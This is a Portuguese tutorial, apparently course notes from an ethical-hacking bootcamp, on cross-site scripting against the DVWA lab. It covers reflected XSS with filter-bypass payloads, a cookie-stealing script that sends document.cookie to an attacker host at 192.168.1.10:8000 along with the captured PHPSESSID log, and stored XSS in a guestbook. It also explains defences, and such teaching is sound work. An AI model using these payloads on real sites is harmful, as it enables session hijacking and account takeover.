# XSS (Cross-Site Scripting)

É uma vulnerabilidade em que **entrada não confiável** é **injetada** numa página e o navegador da vítima **executa JavaScript** sob o **mesmo domínio** do site legítimo. Isso pode permitir ações em nome do usuário, roubo de dados exibidos na página, phishing in-page e, em alguns casos, uso/roubo de sessão.

**Tipos principais:**

* **Reflected (não persistente):** o payload vem da requisição (URL, POST, cabeçalho) e é refletido na resposta.
* **Stored (persistente):** o payload é **armazenado** no servidor (ex.: comentários) e afeta quem visualizar.
* **DOM-Based:** a vulnerabilidade está no **cliente**; o JS manipula o DOM com dados não confiáveis (ex.: `location.search`) e cria HTML/script inseguro.

**Comparativo dos tipos de XSS**

| Aspecto                  | Reflected XSS                                        | Stored XSS                                                                 | DOM-Based XSS                                                                                        |
| ------------------------ | ---------------------------------------------------- | -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| Definição curta          | Entrada maliciosa é **refletida** na resposta        | Entrada maliciosa é **salva** e servida depois                             | **JS do front** transforma dados não confiáveis em HTML/JS                                           |
| Persistência             | Não                                                  | **Sim** (atinge vários usuários)                                           | Depende do DOM; geralmente não persistente                                                           |
| Vetor típico             | Link malicioso / requisição forjada                  | Campo de cadastro/comentário/perfil                                        | Leitura de `location`, `hash`, `storage`, mensagens `postMessage`                                    |
| Onde falha               | Renderização no **servidor** sem escape por contexto | Armazenamento/saída no **servidor** sem escape por contexto                | **Código do cliente** (ex.: `innerHTML`, `document.write`)                                           |
| Precisa clicar em link?  | Geralmente **sim**                                   | Não necessariamente                                                        | Às vezes (se origem for URL/hash)                                                                    |
| Atinge todos visitantes? | Normalmente não                                      | **Sim**, quem abrir a página afetada                                       | Tipicamente só quem aciona o fluxo vulnerável                                                        |
| Sinks perigosos          | Saída em HTML/atributos/JS embutido                  | Idem                                                                       | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `eval`, `new Function`                               |
| Impacto típico           | Execução de ações, exfiltração de dados da página    | **Amplificado** (muitos usuários)                                          | Igual aos demais, mas sem passar pelo servidor                                                       |
| Deteção (alto nível)     | Ver se parâmetros aparecem sem escape na resposta    | Postar conteúdo com caracteres especiais e observar renderização           | Inspecionar JS/fluxo do DOM; forçar valores em URL/hash e ver mutações inseguras                     |
| Mitigações-chave         | Escape **por contexto** + validação + CSP            | Escape **por contexto** + validação na **entrada e saída** + moderação/CSP | Evitar sinks inseguros; usar `textContent`; templates com auto-escape; sanitizadores confiáveis; CSP |

> **Observações importantes**
>
> * **CSP** com **nonce/`strict-dynamic`** reduz muito o impacto/viabilidade.
> * Cookies de sessão: use **`HttpOnly`** (impede leitura via JS), **`Secure`** + **HTTPS/HSTS**, **`SameSite`**. HttpOnly **não impede** que XSS faça ações em seu nome, mas bloqueia leitura direta do cookie.
> * “Sanitização” deve ser **por contexto** (HTML, atributo, URL, JS, CSS). Não confie em uma única função “genérica”.

**Variantes e termos relacionados**

* **Blind XSS:** forma de Stored que dispara em consoles/admins (ex.: painel de suporte).
* **mXSS (Mutation XSS):** o navegador/sanitizador “muta” o HTML e reintroduz perigo.
* **Self-XSS:** engenharia social para a própria vítima colar código no console (não é falha do site).
* **UXSS:** exploração de bug no navegador/extensão, menos comum, alto impacto.

## XSS Relected 

Com o uso do DVWA do metasploit, exploraremos a vunerabidade em reflected XSS, começando pelo nível baixo de segurança.

### Nível baixo de segurança

A intenção da página é criar um texto de boa-vinda com o nome do usuário, como abaixo:

![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_01.png)

![Resposta](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_02.png)

Contudo, se passarmos um JavaScript... (`<script>alert("XSS found")</script>`)

![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_03.png)

Ele é executado.

![Resposta](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_04.png)

Desta forma, podemos observar que a página não filtra a injeção de JavaScripts

### Nível médio de segurança

Ao tentar passarmos o mesmo JavaScript... (`<script>alert("XSS found")</script>`)

![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_03.png)

Ele **não é executado**.

![Resposta](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_05.png)

A página está filtrando. Contudo se passarmos variações do comando como
* `<SCRIPT>alert("XSS found")</SCRIPT>` (em maiúculas), ou
  ![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_07.png)
* `<scr<script>ipt>alert("XSS found")</script>` (ao filtrar a palavra *<script>* do comando, o comando original *<script>alert("XSS found")</script>* é reestabelecido.
  ![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_08.png)

O JavaScript é executado

![Resposta](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/5907fb7ed1333414369d0a182f45d6a0e5d7089c/7%20-%20websites/xss_04.png)

## Roubo de Cookie

Neste exercício, o objetivo é roubar o cookie de sessão do usuário.

**1.** Iniciar um servidor HTTP simples que serve os arquivos do diretório atual na porta 8000. Útil para testes rápidos (abrir no navegador http://<ip>:8000/ e ver/listar arquivos).
```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Ele inicia 
**2.** Injetar na página o comando:

`<script>document.write('<img src="http://192.168.1.10:8000/' + document.cookie + ' ">');</script>`

![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/0b13b93bd820eccdb2d8793901ef41e1979811a3/7%20-%20websites/xss_09.png)

Esse snippet tenta exfiltrar cookies via uma requisição de imagem — um padrão clássico usado em XSS.

**Explicação do script**
- document.cookie → retorna, como string, todos os cookies acessíveis por JavaScript do site atual (ex.: nome1=valor1; nome2=valor2). Cookies com HttpOnly não aparecem aqui.
- document.write(...) → injeta no HTML da página uma tag <img> construída dinamicamente.
- <img src="http://192.168.1.10:8000/ + cookies + "> → o navegador tenta carregar essa imagem, fazendo um HTTP GET para 192.168.1.10:8000 com o valor dos cookies no caminho da URL (o espaço final vira %20).
- Mesmo que a imagem dê 404, o request sai do navegador; quem controla 192.168.1.10:8000 consegue ver/registrar os cookies nos logs do servidor.

**Perigo**

- Em um cenário de XSS (Reflected/Stored), o código roda no contexto do domínio da vítima. Se os cookies de sessão não tiverem HttpOnly, o invasor pode roubar a sessão colocando esses valores na URL e recebendo-os no servidor dele.

**Limitações e defesas**

- HttpOnly no cookie de sessão impede que document.cookie o leia (mitiga “cookie stealing”, embora XSS ainda permita ações em nome do usuário).
- CSP bem configurada (ex.: bloquear scripts inline e img-src para domínios não autorizados) barra a criação desse <img> externo.
- Escapar/sanitizar por contexto toda saída baseada em entrada do usuário evita a execução do script (previne XSS).
- HTTPS + Secure + HSTS, SameSite, escopo mínimo de Domain/Path e, se possível, prefixos __Host-/__Secure- reforçam a proteção de sessão.
- Evite document.write e “sinks” inseguros (innerHTML, etc.) com dados não confiáveis.

**3.** Resultado
Na página:

![Resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/0b13b93bd820eccdb2d8793901ef41e1979811a3/7%20-%20websites/xss_10.png)

*Tenta carregar uma imagem (sem sucesso)*

No terminal:
```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.10 - - [12/Sep/2025 22:49:41] code 404, message File not found
192.168.1.10 - - [12/Sep/2025 22:49:41] "GET /security=medium;%20PHPSESSID=ccfafaeac102b3811d58970bd22e889c HTTP/1.1" 404 -
```
É obtido um `PHPSESSID` válido da sessão do usuário! Quem o obtém costuma poder **assumir a identidade do usuário** na aplicação até a sessão expirar ou ser invalidada.

### O que o atacante pode fazer

* **Sequestrar a sessão (session hijacking):** enviar requisições ao site **com esse cookie** e agir como você (acessar dados, baixar relatórios, ver informações pessoais).
* **Executar ações na conta:** mudar preferências, criar/excluir itens, iniciar transações, **gerar tokens API**, criar “chaves” ou integrações persistentes.
* **Tomar a conta (ATO):** se o app permitir, **alterar e-mail/senha**, configurar autenticação alternativa, cadastrar fator 2FA próprio, gerar códigos de recuperação — e manter acesso mesmo após você sair.
* **Pular 2FA no login:** 2FA protege a **entrada**; com a sessão já autenticada, o atacante **já está dentro**. (Reautenticação pontual para ações sensíveis pode mitigar.)
* **Sessão de administrador:** se o cookie for de um usuário admin, impacto é maior (criação de usuários, alterar permissões, vazar base de dados, etc.).

### Limitação do abuso

* **Expiração / invalidação do servidor:** sessões curtas, logout que **mata a sessão no servidor**, rotação de ID em login/elevação de privilégio.
* **Vinculação fraca de contexto:** alguns apps comparam **IP/UA**; isso reduz, mas não elimina (móveis/CGNAT/Proxies mudam IP; UA é fácil de imitar).
* **Sessão já expirada / regenerada:** se o app **regenera o ID** ao logar ou ao mudar de papel, um `PHPSESSID` antigo perde valor.
* **Controles de ação sensível:** pedir **senha/2FA** de novo para trocar e-mail, gerar token, excluir conta, etc.

> Observação: flags **HttpOnly**, **Secure** e **SameSite** ajudam a **evitar o roubo**, mas **não** impedem o uso **depois que o cookie já foi obtido**. Um invasor pode simplesmente enviar o cookie em requisições HTTPS ao site legítimo.

## XSS Stored

### Nível baixo de segurança

A página é destinada a envio de comentários. Após o usuário inserir seu nome e comentário e clicar em 'Sign guestbook', o comentário é inserido na página. Por exemplo:

![Entrada](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/fd2c140e702f16d7c2bf9aae94f88082b62375fc/7%20-%20websites/img/xss_11.png)

![Resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/fd2c140e702f16d7c2bf9aae94f88082b62375fc/7%20-%20websites/img/xss_12.png)

A ideia é inserir um JavaScript em um dos campos e ver se ele é executado.
* O campo name tem tamanho limitado...
* Desta forma, vamos inserir o script no campo message

![Entrada](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/fd2c140e702f16d7c2bf9aae94f88082b62375fc/7%20-%20websites/img/xss_13.png)

Ao enviar as informações, obtemos:

![Resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/fd2c140e702f16d7c2bf9aae94f88082b62375fc/7%20-%20websites/img/xss_14.png)

![Resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/fd2c140e702f16d7c2bf9aae94f88082b62375fc/7%20-%20websites/img/xss_15.png)

Conclusão: a página é vunerável ao ataque, e toda vez que alguém carregar a página, o script será executado. 

